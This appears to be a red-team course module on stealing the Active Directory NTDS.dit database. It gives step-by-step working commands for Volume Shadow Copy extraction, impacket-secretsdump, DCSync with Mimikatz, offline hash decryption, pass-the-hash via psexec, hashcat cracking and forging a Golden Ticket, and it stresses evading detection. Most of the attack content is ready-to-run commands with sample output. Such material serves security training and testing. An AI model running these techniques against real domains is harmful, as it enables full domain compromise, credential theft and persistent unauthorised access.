# 04 — NTDS.dit — The Crown Jewel

> **Module:** Active Directory
> **Difficulty:** Intermediate
> **RTO Relevance:** Critical — Obtaining NTDS.dit = complete domain compromise

---

## What is NTDS.dit?

NTDS.dit is the **Active Directory database file** stored on every Domain Controller. It contains the complete record of everything in the domain — every user, every password hash, every group, every computer, and every policy.

```
File Location: C:\Windows\NTDS\NTDS.dit
```

> **The analogy:** If the Domain Controller is a bank, NTDS.dit is the vault containing every customer's account PIN. Get the file — get everything.

---

## What's Inside NTDS.dit?

```
NTDS.dit Database
│
├── Users Table
│   ├── ali.hassan → NTLM Hash: aad3b435b51404eeaad3b435b51404ee
│   ├── sara.khan → NTLM Hash: f4e2b8c9d1a3e7f631d6cfe0d16ae931
│   ├── svc.database → NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
│   └── domain.admin → NTLM Hash: 31d6cfe0d16ae93100aad3b435b51404
│
├── Groups Table
│   ├── Domain Admins → [domain.admin, umar.admin]
│   ├── Enterprise Admins → [enterprise.admin]
│   └── Sales Team → [ali.hassan, sara.khan]
│
├── Computers Table
│   ├── PC-KHI-01 → 192.168.1.101
│   ├── SERVER-01 → 192.168.1.10
│   └── DC01 → 192.168.1.5
│
├── KRBTGT Account
│   └── Hash: 49aab0eabb8f9e04d0c9fc8a34e42b96  ← Golden Ticket material
│
└── Policies & Configuration
    ├── Password policies
    ├── Group Policy data
    └── Trust relationships
```

---

## The Challenge — File is Always Locked

Windows keeps NTDS.dit **locked at all times** while AD is running. You cannot simply copy it:

```
> copy C:\Windows\NTDS\NTDS.dit C:\temp\
  The process cannot access the file because it is being
  used by another process.
```

This is why special techniques are needed to extract it.

---

## Extraction Methods

### Method 1 — Volume Shadow Copy (VSS)

Windows has a built-in backup feature called **Volume Shadow Copy Service**. It takes point-in-time snapshots of volumes — and the snapshot copy of NTDS.dit is NOT locked:

```powershell
# Step 1: Create a shadow copy of C: drive
vssadmin create shadow /for=C:

# Output:
# Successfully created shadow copy for 'C:\'
# Shadow Copy ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Step 2: Copy NTDS.dit from shadow copy (not locked!)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit

# Step 3: Copy SYSTEM hive (needed for decryption)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Step 4: Transfer both files to attacker machine
# Step 5: Extract hashes offline
```

### Method 2 — Secretsdump (Impacket) — Remote Extraction

If you have Domain Admin credentials, you can dump NTDS.dit **remotely** without touching the file system manually:

```bash
# From attacker's Kali Linux
impacket-secretsdump domain.admin:Password123@192.168.1.5

# Output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::
# ali.hassan:1103:aad3b435b51404ee:8846f7eaee8fb117:::
# sara.khan:1104:aad3b435b51404ee:f4e2b8c9d1a3e7f6:::
# svc.database:1105:aad3b435b51404ee:49aab0eabb8f9e04:::
# krbtgt:502:aad3b435b51404ee:49aab0eabb8f9e04d0c9fc8a34e42b96:::
```

### Method 3 — DCSync Attack (The Stealthiest)

**The most elegant method.** Domain Controllers sync their databases with each other using the **Directory Replication Service (DRS)**. An attacker with the right permissions can **impersonate a DC** and request replication data:

```
How it works:
Multiple DCs exist in large environments
DCs sync (replicate) data with each other
Any DC can ask another: "Give me your latest data"
        ↓
Attacker pretends to be a DC
Sends replication request to real DC
        ↓
Real DC thinks it's talking to another DC
Sends all the data — including password hashes
        ↓
Attacker receives all hashes
WITHOUT ever touching NTDS.dit file
WITHOUT logging onto the DC
```

```bash
# DCSync using Impacket (from attacker machine)
impacket-secretsdump -just-dc techcorp.local/domain.admin:Password123@192.168.1.5

# DCSync using Mimikatz (from compromised Windows machine)
lsadump::dcsync /domain:techcorp.local /all /csv
```

**Why DCSync is the preferred method:**
- Never touches the disk — no file created
- Looks like normal DC replication traffic
- Can target specific accounts instead of dumping everything
- Much harder to detect than VSS or file-based methods

### Required Permissions for DCSync

You do NOT need to be Domain Admin for DCSync. These AD permissions are sufficient:
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`
- `DS-Replication-Get-Changes-In-Filtered-Set`

```bash
# Check who has DCSync rights (BloodHound query or PowerView)
Get-ObjectAcl -DistinguishedName "DC=techcorp,DC=local" -ResolveGUIDs | 
    Where-Object {$_.ObjectAceType -match "DS-Replication"}
```

---

## NTDS.dit + SYSTEM Hive = Decrypted Hashes

NTDS.dit alone is not enough — the hashes inside are **encrypted**. You need the SYSTEM hive to decrypt them:

```
NTDS.dit = Encrypted database
SYSTEM hive = Encryption key (Boot Key / SysKey)

NTDS.dit + SYSTEM hive → Decrypted NTLM hashes
```

```bash
# Extract hashes from files offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Output:
# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::
# [lm hash]:[nt hash]
# The NT hash (second one) is what you use for Pass-the-Hash
```

---

## What To Do With Hashes

### Option 1 — Pass-the-Hash (Immediate Access)

```bash
# Use Domain Admin hash directly — no cracking
impacket-psexec -hashes aad3b435b51404ee:31d6cfe0d16ae931 \
    administrator@192.168.1.5

# Shell on DC as Administrator ✅
```

### Option 2 — Crack Hashes Offline

```bash
# Crack with Hashcat (NTLM = mode 1000)
hashcat -m 1000 hashes.txt rockyou.txt

# Results:
# 8846f7eaee8fb117ad06bdd830b7586c:Password123
# f4e2b8c9d1a3e7f631d6cfe0d16ae931:Summer2023!
```

### Option 3 — Golden Ticket (Eternal Access)

```bash
# Extract KRBTGT hash from dump:
# krbtgt:502:aad3b435b51404ee:49aab0eabb8f9e04d0c9fc8a34e42b96:::
# NT hash: 49aab0eabb8f9e04d0c9fc8a34e42b96

# Get Domain SID
Get-DomainSID  # or whoami /user and trim last section

# Create Golden Ticket with Mimikatz
kerberos::golden /user:FakeAdmin /domain:techcorp.local \
    /sid:S-1-5-21-3623811015-3361044348-30300820 \
    /krbtgt:49aab0eabb8f9e04d0c9fc8a34e42b96 \
    /endin:87600 /renewmax:700000 /ptt

# /ptt = Pass-the-Ticket (inject into current session)
# Now you ARE Domain Admin — for 10 years
```

---

## KRBTGT — The Most Dangerous Hash

The KRBTGT account is a special service account used by Kerberos to sign all TGTs. Its hash is the master key:

```
KRBTGT hash in hand
        ↓
Forge ANY TGT in the domain
        ↓
Be any user — including non-existent ones
        ↓
Access any resource
        ↓
Valid for as long as you set (10 years by default in attacks)
        ↓
Even if domain.admin password is reset — your ticket stays valid
        ↓
Only defense: Reset KRBTGT password TWICE
```

---

## Key Takeaways

- NTDS.dit = AD database file at `C:\Windows\NTDS\NTDS.dit`
- Contains: All users, all password hashes, all groups, all computers
- Always locked while AD is running — special techniques needed
- Three extraction methods: **VSS** (file copy), **Secretsdump** (remote), **DCSync** (stealthiest)
- Must pair with **SYSTEM hive** to decrypt the hashes
- After extraction: Pass-the-Hash, Crack, or Golden Ticket
- **KRBTGT hash** = forge eternal tickets for any user in the domain
- DCSync is preferred in real operations — no disk artifacts, looks like normal traffic

---
